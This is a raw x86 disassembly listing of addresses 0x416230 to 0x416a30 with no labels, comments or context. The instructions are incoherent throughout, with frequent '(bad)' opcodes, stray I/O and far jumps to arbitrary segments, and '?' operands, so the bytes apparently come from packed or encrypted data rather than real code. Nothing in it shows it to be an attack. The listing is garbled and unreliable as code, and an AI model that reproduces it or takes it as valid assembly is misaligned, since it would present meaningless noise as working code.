  416230:	mov    ebx,0xa125696f
  416235:	sahf   
  416236:	inc    eax
  416237:	stos   DWORD PTR es:[edi],eax
  416238:	cmp    esi,DWORD PTR gs:[esi-0x4f]
  41623c:	jg     0x416262
  41623e:	fcomp  DWORD PTR [edx+0x6602b0ce]
  416244:	sahf   
  416245:	sbb    BYTE PTR [edx-0x2c1d1c2d],dl
  41624b:	popf   
  41624c:	cmp    BYTE PTR [esi],ah
  41624e:	out    dx,eax
  41624f:	jp     0x41622f
  416251:	ins    DWORD PTR es:[edi],dx
  416252:	std    
  416253:	add    BYTE PTR [esi+ebp*1],al
  416256:	jbe    0x416281
  416258:	cs out dx,al
  41625a:	mov    dh,0xe2
  41625c:	mov    al,ds:0x8b432156
  416261:	xor    bl,BYTE PTR [edi-0x6051ab6d]
  416267:	sahf   
  416268:	shr    BYTE PTR [ebx],cl
  41626a:	imul   ecx,DWORD PTR [edx-0x160a26ab],0xbf886050
  416274:	out    dx,eax
  416275:	xor    al,0xd0
  416277:	ins    DWORD PTR es:[edi],dx
  416278:	imul   eax,DWORD PTR [ecx],0xffffffb0
  41627b:	cwde   
  41627c:	push   ebp
  41627d:	popf   
  41627e:	push   eax
  41627f:	popa   
  416280:	lahf   
  416281:	push   esp
  416282:	mov    edx,0x364c47b3
  416287:	(bad)  
  416288:	push   esp
  416289:	aas    
  41628a:	xor    BYTE PTR [ebp-0x6b91c2e9],al
  416290:	ins    BYTE PTR es:[edi],dx
  416291:	inc    esi
  416292:	das    
  416293:	pusha  
  416294:	test   DWORD PTR [eax+ecx*4+0x12],edx
  416298:	das    
  416299:	ss repz inc esi
  41629c:	add    ebp,0x95a2b5f
  4162a2:	fs or  al,0xe
  4162a5:	ja     0x4162fb
  4162a7:	or     BYTE PTR [esi+0x5049da1f],0xd6
  4162ae:	fwait
  4162af:	and    ah,BYTE PTR [edi]
  4162b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162b3:	or     BYTE PTR [ebx+0x22],bl
  4162b6:	js     0x416249
  4162b8:	push   ecx
  4162b9:	fcom   st(5)
  4162bb:	out    dx,al
  4162bc:	sub    eax,0x29f3e2ae
  4162c1:	pop    edx
  4162c2:	mov    esp,0xe27dff74
  4162c7:	int3   
  4162c8:	inc    DWORD PTR [ecx+0x3f4d7a58]
  4162ce:	or     eax,0xebded64e
  4162d3:	pusha  
  4162d4:	cmp    eax,0x86b95cf8
  4162d9:	(bad)  
  4162da:	mov    esp,0x35651163
  4162df:	dec    ebx
  4162e0:	scas   eax,DWORD PTR es:[edi]
  4162e1:	aad    0x45
  4162e3:	loopne 0x4162f5
  4162e5:	xchg   BYTE PTR [edx+0x39dc180],cl
  4162eb:	push   ebx
  4162ec:	mov    fs,WORD PTR [eax-0x2bc1f0ab]
  4162f2:	mov    edi,0x9d417892
  4162f7:	rcl    ah,1
  4162f9:	mov    ebx,0xd4d43623
  4162fe:	mov    ds:0x1ba9341e,eax
  416303:	je     0x41628b
  416305:	sahf   
  416306:	in     al,dx
  416307:	lahf   
  416308:	stc    
  416309:	enter  0xe229,0xb1
  41630d:	daa    
  41630e:	mov    ds:0xd67ea48c,al
  416313:	shr    ch,cl
  416315:	out    0x72,al
  416317:	shl    BYTE PTR [ecx+0x4519aabf],0x12
  41631e:	xor    DWORD PTR [esi-0x4c],ecx
  416321:	push   edx
  416322:	aaa    
  416323:	(bad)  
  416324:	push   ebp
  416325:	(bad)  
  416326:	xor    eax,0xdb4666c8
  41632b:	jp     0x416338
  41632d:	and    dl,BYTE PTR [eax]
  41632f:	add    al,0x75
  416331:	ss cmc 
  416333:	jle    0x416308
  416335:	adc    edi,edi
  416337:	mov    ch,0xef
  416339:	add    eax,0xc123c5cd
  41633e:	sar    BYTE PTR [edi],cl
  416340:	(bad)  
  416341:	inc    esi
  416342:	mov    dh,0xa5
  416344:	push   esi
  416345:	std    
  416346:	inc    ebx
  416347:	ret    0xee24
  41634a:	dec    ecx
  41634b:	jb     0x4163b0
  41634d:	(bad)  
  41634e:	(bad)  [ecx-0x2]
  416351:	dec    eax
  416352:	loope  0x416356
  416354:	mov    edx,DWORD PTR [ebp+0x41f52abf]
  41635a:	popa   
  41635b:	jecxz  0x4163b7
  41635d:	jne    0x416375
  41635f:	cmc    
  416360:	iret   
  416361:	pushf  
  416362:	xchg   BYTE PTR [ebx],ah
  416364:	jge    0x416332
  416366:	scas   al,BYTE PTR es:[edi]
  416367:	sub    eax,0x494fb65b
  41636c:	push   esi
  41636d:	xchg   DWORD PTR [edx],eax
  41636f:	shl    DWORD PTR [ebx-0x2],1
  416372:	test   DWORD PTR [edi-0x1fae986f],eax
  416378:	and    DWORD PTR [edi+0x61958314],ecx
  41637e:	stos   BYTE PTR es:[edi],al
  41637f:	sub    BYTE PTR [edi+0x7b1e0889],bh
  416385:	pop    esi
  416386:	data16 aad 0x4c
  416389:	jmp    0xc68d:0x7a17731b
  416390:	adc    DWORD PTR [edx+eax*8-0x49908bff],0xffffffb8
  416398:	jmp    0xebe7:0xd30a30a
  41639f:	je     0x416402
  4163a1:	mov    ch,0xa2
  4163a3:	adc    al,0xe3
  4163a5:	das    
  4163a6:	adc    BYTE PTR [eax-0x75],bh
  4163a9:	jno    0x416375
  4163ab:	dec    ecx
  4163ac:	loopne 0x4163f6
  4163ae:	ss xchg esi,eax
  4163b0:	push   eax
  4163b1:	das    
  4163b2:	mov    ss,esi
  4163b4:	addr16 retf 0x647f
  4163b8:	adc    eax,0x45ae93f4
  4163bd:	mov    bl,0x8
  4163bf:	and    BYTE PTR ds:0xd0340b90,bl
  4163c5:	push   ebx
  4163c6:	xor    al,0xa7
  4163c8:	cdq    
  4163c9:	pop    ecx
  4163ca:	xchg   ebx,eax
  4163cb:	jg     0x416414
  4163cd:	(bad)  
  4163ce:	push   ebx
  4163cf:	or     eax,0xcebb3791
  4163d4:	mov    cl,0x10
  4163d6:	cmp    eax,0xfe034b55
  4163db:	js     0x4163b1
  4163dd:	mov    al,0x1
  4163df:	jecxz  0x4163a7
  4163e1:	push   ebp
  4163e2:	ficomp WORD PTR [esp+eax*4-0x44f57d6e]
  4163e9:	cmp    al,0x4e
  4163eb:	shr    DWORD PTR [ebx],0x9a
  4163ee:	loope  0x4163a5
  4163f0:	mov    dl,0x24
  4163f2:	mov    edi,0xba7e6a42
  4163f7:	xor    eax,0x943d5592
  4163fc:	xchg   edi,eax
  4163fd:	iret   
  4163fe:	jge    0x41647d
  416400:	jne    0x416460
  416402:	in     eax,dx
  416403:	mov    cl,BYTE PTR [ebp-0x70a693e2]
  416409:	icebp  
  41640a:	nop
  41640b:	std    
  41640c:	mov    WORD PTR [ebx-0x1],?
  41640f:	les    esp,FWORD PTR [ecx+0x4959c115]
  416415:	fs or  al,0xa5
  416418:	rcl    BYTE PTR [edi+0x6d],cl
  41641b:	in     al,dx
  41641c:	or     eax,0x4373cbeb
  416421:	inc    ebx
  416422:	xchg   edi,eax
  416424:	rol    DWORD PTR [ebp+0x3f794844],0x21
  41642b:	or     ecx,ecx
  41642d:	sbb    BYTE PTR [eax],ch
  41642f:	push   ebp
  416430:	jns    0x4163cb
  416432:	jle    0x4163d4
  416434:	adc    BYTE PTR [eax+0x2a],ah
  416437:	(bad)  
  416438:	mov    edi,0x7c5b8cc7
  41643d:	(bad)  
  41643e:	leave  
  41643f:	mov    eax,ds:0xc7849540
  416444:	pop    edi
  416445:	imul   edi,DWORD PTR [esi-0xc3a2f47],0xcfd67567
  41644f:	push   edi
  416450:	fucomip st,st(5)
  416452:	jae    0x4163e2
  416454:	push   ds
  416455:	repnz push ebp
  416457:	frstor [esi]
  416459:	mov    ebp,0xc54c24a
  41645e:	out    0xee,al
  416460:	lds    edi,FWORD PTR [ebp-0x2d]
  416463:	and    eax,0x7352bc96
  416468:	mov    WORD PTR [ebx],?
  41646a:	xchg   ebx,eax
  41646b:	adc    DWORD PTR ds:0x45b9737d,0xe2e5553b
  416475:	jno    0x41642e
  416477:	or     ah,BYTE PTR [eax+0x41b8d235]
  41647d:	es mov ah,0x10
  416480:	xlat   BYTE PTR ds:[ebx]
  416481:	lods   eax,DWORD PTR ds:[esi]
  416482:	jmp    0x416420
  416484:	sub    DWORD PTR [edx+0x50],0x4d
  416488:	in     al,0xf8
  41648a:	ins    DWORD PTR es:[edi],dx
  41648b:	cli    
  41648c:	aad    0x6c
  41648e:	arpl   bp,bx
  416490:	(bad)  
  416492:	inc    ecx
  416493:	jmp    0x4164a4
  416495:	imul   ebp,DWORD PTR [ecx-0x52e183f],0xdb72ac7c
  41649f:	add    esp,edx
  4164a1:	mov    esp,0x10131221
  4164a6:	fiadd  WORD PTR [edi-0x3e]
  4164a9:	jae    0x4164e4
  4164ab:	inc    esi
  4164ac:	or     al,0x3a
  4164ae:	xor    eax,0xdd532691
  4164b3:	shl    bh,cl
  4164b5:	jne    0x4164e7
  4164b7:	push   0x15b8e059
  4164bc:	cmc    
  4164bd:	cmp    eax,0xa9610564
  4164c2:	and    eax,0x6bc5f5d5
  4164c7:	fidivr WORD PTR [ebp+0x67]
  4164ca:	gs cmp al,0x78
  4164cd:	mov    ebp,0xac5d644e
  4164d2:	les    esp,FWORD PTR [eax-0x22]
  4164d5:	adc    al,0x82
  4164d7:	pop    esp
  4164d8:	adc    eax,0x55544c64
  4164dd:	fiadd  DWORD PTR [ebp+0x14c4a8c4]
  4164e3:	loopne 0x4164f9
  4164e5:	out    dx,eax
  4164e6:	inc    ecx
  4164e7:	lds    esp,FWORD PTR [ebp+0xa4f5053]
  4164ed:	mov    bh,0xb2
  4164ef:	loop   0x41649b
  4164f1:	inc    edi
  4164f2:	dec    ebx
  4164f3:	test   al,cl
  4164f5:	into   
  4164f6:	sbb    eax,DWORD PTR [esi-0x6f]
  4164f9:	icebp  
  4164fa:	repz rol eax,cl
  4164fd:	cld    
  4164fe:	sub    eax,DWORD PTR [edi-0x1d]
  416501:	repz mov WORD PTR [ecx-0xafc4b0c],?
  416508:	cli    
  416509:	in     al,0xfd
  41650b:	mov    ebx,0xed9f02f7
  416510:	lock or BYTE PTR [eax],cl
  416513:	push   eax
  416514:	mov    ebx,0x27f591f9
  416519:	xchg   ecx,esi
  41651b:	out    0x7b,al
  41651d:	lds    esp,FWORD PTR [edi-0x43]
  416520:	rcl    bl,1
  416522:	push   0x65
  416524:	popa   
  416525:	repnz aad 0x34
  416528:	push   ds
  416529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41652a:	je     0x416518
  41652c:	or     DWORD PTR [eax],edx
  41652e:	pop    ds
  41652f:	ins    BYTE PTR es:[edi],dx
  416530:	add    al,BYTE PTR [edi+ebx*4+0x200573ed]
  416537:	add    DWORD PTR [ecx],ebp
  416539:	cwde   
  41653a:	sub    BYTE PTR gs:[edx],ch
  41653d:	sahf   
  41653e:	pop    ds
  41653f:	mov    esi,0x70915988
  416544:	jecxz  0x4165bf
  416546:	call   0x3e82:0x94eb3cea
  41654d:	xchg   ebp,eax
  41654e:	ror    BYTE PTR [eax-0x70],0xde
  416552:	mov    DWORD PTR [edi],eax
  416554:	and    edi,edx
  416556:	retf   
  416557:	cmp    DWORD PTR [edi-0x1aa50350],ecx
  41655d:	mov    eax,0x53c5610c
  416562:	cmp    DWORD PTR [edi],0x22242e7b
  416568:	repz shr DWORD PTR [eax-0x2e],cl
  41656c:	nop
  41656d:	push   edx
  41656e:	pop    es
  41656f:	hlt    
  416570:	mov    ch,0x73
  416572:	jbe    0x416552
  416574:	stc    
  416575:	xchg   ebp,eax
  416576:	ret    
  416577:	in     al,dx
  416578:	mov    ch,0x3f
  41657a:	cmp    cl,BYTE PTR [eax+ebp*1-0x3050b828]
  416581:	push   edx
  416582:	inc    ebx
  416583:	clc    
  416584:	ja     0x4165a5
  416586:	sbb    DWORD PTR [ebp+0xc],ebx
  416589:	(bad)  
  41658b:	(bad)  
  41658c:	fdivr  QWORD PTR [ebp+0x6c0f769c]
  416592:	mov    cs,edi
  416594:	sub    DWORD PTR [edi],0x7a87c810
  41659a:	pop    eax
  41659b:	imul   ecx,DWORD PTR [ebp-0x22a6bdf5],0xfffffff8
  4165a2:	sbb    bh,BYTE PTR [edx+0x62e9fb23]
  4165a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165a9:	rol    BYTE PTR [ebx],0x98
  4165ac:	popa   
  4165ad:	loop   0x416547
  4165af:	pop    ebp
  4165b0:	js     0x4165c8
  4165b2:	xchg   ebp,eax
  4165b3:	sbb    esi,DWORD PTR [eax-0x37]
  4165b6:	cmp    DWORD PTR [ecx+0x240219c8],eax
  4165bc:	jnp    0x4165a6
  4165be:	out    dx,eax
  4165bf:	pushf  
  4165c0:	push   ecx
  4165c1:	or     eax,0x5514756e
  4165c6:	sbb    DWORD PTR [ebp+ebx*4+0x35],0xef84e785
  4165ce:	mov    dh,0x3a
  4165d0:	idiv   DWORD PTR [edi-0x6b]
  4165d3:	gs mov al,cl
  4165d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165d7:	sbb    esi,DWORD PTR [eax-0x7090001d]
  4165dd:	jge    0x4165ae
  4165df:	rcl    BYTE PTR [eax-0x68],1
  4165e2:	mov    eax,0xe2b451ce
  4165e7:	int    0xfa
  4165e9:	fs sub al,0x7e
  4165ec:	mov    edx,0xe15a2106
  4165f1:	fadd   DWORD PTR [edx-0x24cedc77]
  4165f7:	imul   ebx,DWORD PTR [ebx],0xffffffb0
  4165fa:	jo     0x416609
  4165fc:	xchg   esi,eax
  4165fd:	xlat   BYTE PTR ds:[ebx]
  4165fe:	push   ebp
  4165ff:	mov    al,ds:0xa72674b7
  416604:	xchg   edx,eax
  416605:	dec    ebx
  416606:	mov    cl,0x56
  416608:	hlt    
  416609:	mov    dl,0x20
  41660b:	imul   edx,DWORD PTR [esi+edx*1-0x16481246],0xffffffc5
  416613:	cmp    DWORD PTR ds:0xe04b5fbd,esp
  416619:	inc    ebp
  41661a:	daa    
  41661b:	enter  0xaa70,0xb8
  41661f:	jb     0x416693
  416621:	dec    ebx
  416622:	adc    bh,BYTE PTR [ebp-0x76]
  416625:	int    0xa2
  416627:	jae    0x41669a
  416629:	or     ebp,ebp
  41662b:	xchg   esp,eax
  41662c:	in     eax,0x61
  41662e:	retf   0x73d
  416631:	imul   esp,DWORD PTR [ecx-0x24],0x66
  416635:	into   
  416636:	jmp    0xfe93:0x67e8e684
  41663d:	sub    ebp,esi
  41663f:	lds    ecx,FWORD PTR [edi]
  416641:	repz add ecx,0x8ee9b093
  416648:	mov    ecx,DWORD PTR [esi-0x79]
  41664b:	lahf   
  41664c:	sets   al
  41664f:	lods   eax,DWORD PTR ds:[esi]
  416650:	mov    dl,0xd1
  416652:	xchg   ebp,eax
  416653:	pop    esp
  416654:	pop    eax
  416655:	lock xchg edx,eax
  416657:	push   ss
  416658:	scas   eax,DWORD PTR es:[edi]
  416659:	sub    esp,DWORD PTR [edx]
  41665b:	jmp    0xd4ea:0xc472fdf7
  416662:	cdq    
  416663:	and    ebx,ebx
  416665:	call   0xea8e:0x31195d0e
  41666c:	xor    al,0x26
  41666e:	test   DWORD PTR [edi],ebp
  416670:	scas   eax,DWORD PTR es:[edi]
  416671:	ins    BYTE PTR es:[edi],dx
  416672:	sahf   
  416673:	cmp    ecx,esp
  416675:	sub    al,0xe
  416677:	inc    ebx
  416678:	xor    al,0xca
  41667a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41667b:	pop    edi
  41667c:	mov    DWORD PTR ds:0xc86c5cf,ebx
  416682:	arpl   WORD PTR [edx-0x118eedfa],di
  416688:	iret   
  416689:	and    BYTE PTR [edi-0x61],0x44
  41668d:	ja     0x41664e
  41668f:	or     eax,0x155333f
  416694:	scas   al,BYTE PTR es:[edi]
  416695:	add    eax,0xa0cf7057
  41669a:	mov    WORD PTR [ebp-0x77],ss
  41669d:	inc    esp
  41669e:	xchg   ebp,eax
  41669f:	aas    
  4166a0:	js     0x41662f
  4166a2:	scas   al,BYTE PTR es:[edi]
  4166a3:	fwait
  4166a4:	outs   dx,BYTE PTR ds:[esi]
  4166a5:	xchg   esp,eax
  4166a6:	in     al,dx
  4166a7:	push   ss
  4166a8:	cmp    ecx,DWORD PTR [ebx]
  4166aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166ab:	xchg   DWORD PTR [eax+ebp*4+0x1e],ebx
  4166af:	popa   
  4166b0:	call   0x8c73:0xbda4fde1
  4166b7:	pop    ecx
  4166b8:	in     eax,0xe9
  4166ba:	adc    eax,0xd550c83b
  4166bf:	scas   eax,DWORD PTR es:[edi]
  4166c0:	(bad)  
  4166c2:	mov    ebx,0xafa0e9d9
  4166c7:	dec    ebp
  4166c8:	loop   0x4166d7
  4166ca:	jp     0x4166ad
  4166cc:	out    0x48,eax
  4166ce:	imul   ecx,DWORD PTR [ecx],0xffffffa8
  4166d1:	sbb    edi,DWORD PTR [eax-0x2f77e7d1]
  4166d7:	call   0x226fd90b
  4166dc:	(bad)  
  4166dd:	push   cs
  4166de:	daa    
  4166df:	pop    ecx
  4166e0:	int3   
  4166e1:	int3   
  4166e2:	mov    ebp,0x26dbee0b
  4166e7:	pushf  
  4166e8:	sub    DWORD PTR [ebx+0x725e24b1],edx
  4166ee:	retf   
  4166ef:	enter  0x3fb,0x11
  4166f3:	cld    
  4166f4:	add    al,0x66
  4166f6:	push   ds
  4166f7:	pusha  
  4166f8:	pop    esi
  4166f9:	daa    
  4166fa:	cmp    dl,BYTE PTR [ecx-0x66]
  4166fd:	jno    0x41676d
  4166ff:	in     eax,dx
  416700:	xchg   BYTE PTR [eax+0x6f],dl
  416703:	add    ch,BYTE PTR [edi-0xf]
  416706:	out    dx,al
  416707:	mov    al,ds:0x2c3cb6cd
  41670c:	bound  esp,QWORD PTR [edx+0x32]
  41670f:	scas   al,BYTE PTR es:[edi]
  416710:	xor    ebp,eax
  416712:	aaa    
  416713:	ret    
  416714:	cmp    BYTE PTR [ecx],dl
  416716:	xchg   bh,dl
  416718:	mov    ebp,0x9185c38e
  41671d:	jnp    0x416787
  41671f:	xchg   ebx,eax
  416720:	pushf  
  416721:	jmp    0x479b:0xcf7f9e30
  416728:	push   es
  416729:	cmp    eax,0x765d5e3b
  41672e:	sahf   
  41672f:	loope  0x4167aa
  416731:	dec    edx
  416732:	xlat   BYTE PTR ds:[ebx]
  416733:	hlt    
  416734:	adc    edi,ebx
  416736:	test   DWORD PTR [edi-0x6d2ee1f0],ebp
  41673c:	add    ch,BYTE PTR [esp+edi*1-0x74]
  416740:	idiv   DWORD PTR [edx+0x7c7153c4]
  416746:	ins    DWORD PTR es:[edi],dx
  416747:	xchg   esi,eax
  416748:	enter  0xe5a8,0x38
  41674c:	jno    0x41674c
  41674e:	int    0x2b
  416750:	fs scas eax,DWORD PTR es:[edi]
  416752:	pop    ebx
  416753:	pop    ebx
  416754:	nop
  416755:	pop    ebp
  416756:	or     DWORD PTR [ecx-0x6f0c276],0x986541ea
  416760:	and    al,0xe9
  416762:	cmp    DWORD PTR [edi+0x42],ebx
  416765:	es (bad) 
  416767:	lock and al,bl
  41676a:	push   esp
  41676b:	shl    BYTE PTR [esi+ebx*2+0x191b292d],cl
  416772:	pop    ebp
  416773:	(bad)  
  416774:	shr    BYTE PTR [ecx-0x1b],cl
  416777:	and    bh,dh
  416779:	mul    DWORD PTR ds:0xdcbb7142
  41677f:	imul   esp,DWORD PTR [ebp-0x4e],0x4a
  416783:	in     eax,0x2f
  416785:	iret   
  416786:	test   eax,0xbb9c4956
  41678b:	stos   BYTE PTR es:[edi],al
  41678c:	fldenv [eax-0x33a33502]
  416792:	push   es
  416793:	fst    DWORD PTR [eax-0x44f0b695]
  416799:	arpl   WORD PTR [eax-0x5be0f6e7],sp
  41679f:	fdiv   st(6),st
  4167a1:	inc    BYTE PTR [ebx+0x62]
  4167a4:	mov    ds:0x7d69904f,eax
  4167a9:	mov    ds:0xf021d94e,eax
  4167ae:	mov    bl,0x61
  4167b0:	dec    esi
  4167b1:	mov    eax,0xc1543565
  4167b6:	ss popf 
  4167b8:	sar    DWORD PTR [ebx],1
  4167ba:	test   eax,0xfd9e9025
  4167bf:	imul   edi,DWORD PTR [edx+ecx*1],0x4
  4167c3:	xchg   edx,eax
  4167c4:	mov    ecx,0x92a35df6
  4167c9:	fwait
  4167ca:	inc    esi
  4167cb:	sbb    al,BYTE PTR [edi+eax*4]
  4167ce:	push   eax
  4167cf:	pop    edi
  4167d0:	repz push es
  4167d2:	fidivr WORD PTR [ebp-0x1429d012]
  4167d8:	f2xm1  
  4167da:	leave  
  4167db:	mov    eax,ds:0x1d0b53b2
  4167e0:	jmp    0x4167a9
  4167e2:	adc    al,0x2c
  4167e4:	shr    DWORD PTR [edx+ebp*2+0x203b413],cl
  4167eb:	cmp    edi,DWORD PTR [eax-0x58]
  4167ee:	inc    eax
  4167ef:	dec    edi
  4167f0:	scas   al,BYTE PTR es:[edi]
  4167f1:	hlt    
  4167f2:	cdq    
  4167f3:	pop    edi
  4167f4:	xor    DWORD PTR [edi-0x3b],esp
  4167f7:	or     DWORD PTR [ebp-0x4cd31556],ecx
  4167fd:	xor    BYTE PTR [edi-0x13],cl
  416800:	mov    dl,0x6c
  416802:	pop    eax
  416803:	jne    0x416805
  416805:	dec    eax
  416806:	cmp    BYTE PTR ds:0x700837dd,0xe3
  41680d:	jo     0x416875
  41680f:	loop   0x416814
  416811:	jns    0x416846
  416813:	aad    0x97
  416815:	push   ecx
  416816:	bound  edi,QWORD PTR gs:0x5ad6f049
  41681d:	ret    0xa820
  416820:	lds    esi,FWORD PTR [esi+0x41]
  416823:	(bad)  
  416826:	int3   
  416827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416828:	cmp    BYTE PTR [edi-0x245355f5],dl
  41682e:	jae    0x416881
  416830:	and    BYTE PTR [edx+0x22],bl
  416833:	ds push ds
  416835:	push   eax
  416836:	pop    eax
  416837:	pop    esi
  416838:	scas   eax,DWORD PTR es:[edi]
  416839:	aam    0x82
  41683b:	and    BYTE PTR es:0x48e14379,dh
  416842:	fcmovnb st,st(1)
  416844:	hlt    
  416845:	mov    BYTE PTR [ebp-0x5569ebc1],ch
  41684b:	jp     0x41689f
  41684d:	xchg   edi,eax
  41684e:	xchg   esi,eax
  41684f:	or     eax,eax
  416851:	mov    bl,0x42
  416853:	daa    
  416854:	or     BYTE PTR [ebp+0xc],cl
  416857:	lods   eax,DWORD PTR es:[esi]
  416859:	cli    
  41685a:	add    edi,esp
  41685c:	jle    0x416861
  41685e:	mov    DWORD PTR [eax+0x577529ad],ebx
  416864:	xchg   ebx,eax
  416865:	inc    edi
  416866:	cdq    
  416867:	sbb    ecx,DWORD PTR [esi]
  416869:	call   FWORD PTR [esi+eiz*4]
  41686c:	nop
  41686d:	xor    esi,ebx
  41686f:	aaa    
  416870:	fimul  WORD PTR [edx+0x26]
  416873:	out    dx,al
  416874:	in     al,dx
  416875:	push   ds
  416876:	mov    ?,eax
  416878:	popa   
  416879:	loope  0x4168c6
  41687b:	clc    
  41687c:	jl     0x4168a8
  41687e:	add    DWORD PTR [edi+edi*1+0x77],edx
  416882:	sub    esi,DWORD PTR [edx-0x1e469429]
  416888:	out    dx,al
  416889:	push   cs
  41688a:	mov    esp,DWORD PTR [ebx-0x3143e383]
  416890:	mov    eax,0x6fcf1b1a
  416895:	cli    
  416896:	ins    BYTE PTR es:[edi],dx
  416897:	(bad)  
  416898:	call   0x4f158299
  41689d:	cmp    BYTE PTR [ebx+0x188c595d],cl
  4168a3:	add    eax,0x688cf69d
  4168a8:	cld    
  4168a9:	sub    edi,DWORD PTR [edx-0x76507ea7]
  4168af:	push   ebp
  4168b0:	test   al,0x8b
  4168b2:	push   ebp
  4168b3:	or     BYTE PTR [ebx-0x3d7e53a3],cl
  4168b9:	xchg   ebx,eax
  4168ba:	clc    
  4168bb:	add    BYTE PTR fs:[ebx],cl
  4168be:	ror    DWORD PTR [ecx+0x558bac55],cl
  4168c4:	or     cl,ch
  4168c6:	pushf  
  4168c7:	and    eax,DWORD PTR [eax]
  4168c9:	add    BYTE PTR [edi+0x65],dl
  4168cc:	stos   DWORD PTR es:[edi],eax
  4168cd:	cwde   
  4168ce:	jnp    0x416868
  4168d0:	inc    edi
  4168d1:	jns    0x4168fa
  4168d3:	in     eax,dx
  4168d4:	fistp  DWORD PTR [eax+0x19]
  4168d7:	push   ebx
  4168d8:	jecxz  0x416936
  4168da:	mov    esi,0xfe7a7d3b
  4168df:	pop    edi
  4168e0:	jp     0x41695c
  4168e2:	xor    DWORD PTR [eax],edx
  4168e4:	or     DWORD PTR [edi+0x14],ebp
  4168e7:	adc    DWORD PTR [ecx-0x2f17899d],0x59
  4168ee:	clc    
  4168ef:	ret    0x3a22
  4168f2:	add    al,BYTE PTR [ebp+0x78]
  4168f5:	int3   
  4168f6:	inc    ecx
  4168f7:	xor    ecx,0xf01534e2
  4168fd:	je     0x4168d9
  4168ff:	sub    BYTE PTR [ecx-0x2255a13b],ch
  416905:	scas   al,BYTE PTR es:[edi]
  416906:	push   cs
  416907:	and    al,BYTE PTR [edx+0x3f]
  41690a:	rcr    DWORD PTR [esi],cl
  41690c:	mul    ah
  41690e:	cmp    DWORD PTR [eax],esi
  416910:	mov    ds:0xa1f78d5,al
  416915:	ror    BYTE PTR [edi-0x78d90d25],cl
  41691b:	into   
  41691c:	(bad)  
  41691d:	mov    al,ds:0xe6558625
  416922:	and    eax,0xc54235dd
  416927:	sbb    dh,BYTE PTR [ebx]
  416929:	xor    bh,BYTE PTR [edx]
  41692b:	stc    
  41692c:	inc    ecx
  41692d:	or     ecx,eax
  41692f:	icebp  
  416930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416931:	ret    
  416932:	add    ch,BYTE PTR [esi+ebp*4+0x27]
  416936:	call   0xea8faf81
  41693b:	xor    eax,0x5b7df013
  416940:	(bad)  
  416942:	xor    eax,0x4e08553d
  416947:	xor    eax,0x4e6052f0
  41694c:	cli    
  41694d:	mov    es,WORD PTR [esi*4+0x758cc1ce]
  416954:	ins    DWORD PTR es:[edi],dx
  416955:	inc    edx
  416956:	push   eax
  416957:	cmp    eax,edi
  416959:	enter  0x3c8d,0x0
  41695d:	add    ah,bh
  41695f:	jl     0x4169d8
  416961:	mov    ds:0xaff099de,eax
  416966:	xlat   BYTE PTR ds:[ebx]
  416967:	xlat   BYTE PTR ds:[ebx]
  416968:	not    esi
  41696a:	in     al,0xf1
  41696c:	jnp    0x416960
  41696e:	cmp    DWORD PTR [edi],esp
  416970:	fst    QWORD PTR cs:0x27a277e4
  416977:	mov    dl,0x44
  416979:	repz pop edi
  41697b:	add    BYTE PTR [esi+0x1299d7d9],al
  416981:	mul    al
  416983:	inc    edi
  416984:	das    
  416985:	xlat   BYTE PTR ds:[ebx]
  416986:	fwait
  416987:	inc    ecx
  416988:	jmp    DWORD PTR [esi]
  41698a:	jmp    0x41692b
  41698c:	or     bl,ch
  41698e:	push   ds
  41698f:	ret    0xf844
  416992:	bound  eax,QWORD PTR [esi+esi*8-0x80]
  416996:	outs   dx,DWORD PTR ds:[esi]
  416997:	enter  0x890f,0xfe
  41699b:	push   0xffffffbc
  41699d:	dec    esi
  41699e:	pop    eax
  41699f:	int3   
  4169a0:	sar    ah,1
  4169a2:	stc    
  4169a3:	pop    esi
  4169a4:	dec    eax
  4169a5:	pusha  
  4169a6:	pop    esp
  4169a7:	dec    DWORD PTR [eax]
  4169a9:	push   edx
  4169aa:	push   ebp
  4169ac:	bound  edx,QWORD PTR [esi-0x480482a]
  4169b2:	push   ds
  4169b3:	cmp    eax,0x892f81e0
  4169b8:	cmp    DWORD PTR [edx-0x57],ebp
  4169bb:	sti    
  4169bc:	xchg   esp,eax
  4169bd:	outs   dx,DWORD PTR ds:[esi]
  4169be:	sbb    al,0x6e
  4169c0:	push   es
  4169c1:	addr16 push eax
  4169c3:	and    BYTE PTR [ebx],dh
  4169c5:	jo     0x416961
  4169c7:	fiadd  DWORD PTR [ebp+edx*1+0x65240627]
  4169ce:	stos   DWORD PTR es:[edi],eax
  4169cf:	pop    ebx
  4169d0:	inc    ebp
  4169d1:	xor    BYTE PTR [esi],ch
  4169d3:	lahf   
  4169d4:	les    esp,FWORD PTR [esi+eax*4-0x3095219e]
  4169db:	pop    edx
  4169dc:	pop    ebp
  4169dd:	ins    DWORD PTR es:[edi],dx
  4169de:	or     al,BYTE PTR ds:0x98e4f1a
  4169e4:	add    al,0x4c
  4169e6:	cwde   
  4169e7:	iret   
  4169e8:	or     dx,WORD PTR [eax+0x18ae9898]
  4169ef:	xchg   esp,esi
  4169f1:	push   ebx
  4169f2:	adc    BYTE PTR [edx],bl
  4169f4:	mov    ebp,0x38734383
  4169f9:	sahf   
  4169fa:	jae    0x416a42
  4169fc:	call   0x3d726880
  416a01:	fwait
  416a02:	jo     0x416a59
  416a04:	fist   DWORD PTR [ebx+0x53]
  416a07:	push   eax
  416a08:	ja     0x4169f8
  416a0a:	fbld   TBYTE PTR [ecx]
  416a0c:	aas    
  416a0d:	push   es
  416a0e:	mov    al,0x5f
  416a10:	xchg   ecx,eax
  416a11:	add    DWORD PTR [ecx-0x2c],0x3d
  416a15:	int    0xeb
  416a17:	mov    ebx,0x7a6c435
  416a1c:	(bad)  
  416a1e:	dec    edx
  416a1f:	ret    0x3925
  416a22:	pop    ecx
  416a23:	not    DWORD PTR [edx]
  416a25:	dec    ebp
  416a26:	adc    BYTE PTR [edx],ah
  416a28:	sub    BYTE PTR [eax],dh
  416a2a:	fs push 0xbf70b153
  416a30:	mov    eax,0xea91d18b
